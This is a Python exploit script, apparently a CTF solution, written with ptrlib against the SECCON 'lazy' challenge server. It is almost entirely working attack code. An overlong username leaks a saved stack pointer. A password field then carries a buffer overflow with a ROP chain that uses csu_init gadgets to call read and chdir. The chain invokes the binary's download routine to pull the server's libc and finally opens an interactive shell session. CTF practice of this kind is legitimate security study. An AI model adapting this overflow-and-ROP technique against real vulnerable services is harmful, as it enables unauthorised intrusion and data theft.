from ptrlib import *

elf = ELF("./lazy")
sock = Socket("lazy.chal.seccon.jp", 33333)

def login_user(username):
    sock.sendlineafter("Exit\n", "2")
    sock.sendlineafter(": ", username)
    sock.recvuntil(", ")
    sock.recvline()
    output = sock.recvline()
    return output
def login_pass(password):
    sock.sendlineafter(": ", password)
    return

# saved rbp leak
username = b'A' * 0x5f
x = login_user(username)
saved_rbp = u64(x)
logger.info("saved rbp = " + hex(saved_rbp))
password  = b'3XPL01717'
password += b'A' * (0x20 - len(password))
password += b'_H4CK3R_'
password += b'A' * (0x40 - len(password))
password += b'3XPL01717'
password += b'A' * (0x60 - len(password))
password += b'_H4CK3R_'
password += b'A' * (0x80 - len(password))
password += p64(saved_rbp)
password += p64(0x4010e1)
login_pass(password)

rop_pop_rdi = 0x004015f3
rop_pop_rsi_r15 = 0x004015f1
rop_popper = 0x4015ea
rop_csu_init = 0x4015d0

# open libc
username = b'A' * (0x5f + 0x58)
x = login_user(username)
libc_base = u64(x)
logger.info("libc base = " + hex(libc_base))
password  = b'3XPL01717'
password += b'A' * (0x20 - len(password))
password += b'_H4CK3R_'
password += b'A' * (0x40 - len(password))
password += b'3XPL01717'
password += b'A' * (0x60 - len(password))
password += b'_H4CK3R_'
password += b'A' * (0x80 - len(password))
password += p64(saved_rbp)
# read(0, 0x602400, 0x10)
password += p64(rop_popper)
password += p64(0)
password += p64(1)
password += p64(elf.got("read"))
password += p64(0x40)
password += p64(0x602000 + 0x400)
password += p64(0)
password += p64(rop_csu_init)
password += p64(0) * 7
password += p64(0x40104e)
login_pass(password)
sock.send("libc.so.6A\x00./q/private\x00")

# leak
username = b'A' * (0x5f + 0x58)
login_user(username)
password  = b'3XPL01717'
password += b'A' * (0x20 - len(password))
password += b'_H4CK3R_'
password += b'A' * (0x40 - len(password))
password += b'3XPL01717'
password += b'A' * (0x60 - len(password))
password += b'_H4CK3R_'
password += b'A' * (0x80 - len(password))
password += p64(saved_rbp)
# chdir("./q/private")
password += p64(rop_popper)
password += p64(0)
password += p64(1)
password += p64(elf.got("chdir"))
password += p64(0)
password += p64(0)
password += p64(0x602000 + 0x400 + 11)
password += p64(rop_csu_init)
password += p64(0) * 7
password += p64(rop_pop_rdi)
password += p64(0x602400)
password += p64(elf.symbol("download"))
password += p64(0xffffffffffffffff)
# read(fd, bss + 0x100, 0xf00)
login_pass(password)
f = open("server.libc", "wb")
sock.recvuntil("Sending ")
size = int(sock.recvuntil("bytes").split(b' ')[0])

total = 0
while not total >= size:
    print(hex(size), hex(total))
    r = sock.recv(0x100000)
    f.write(r)
    total += len(r)

sock.interactive()
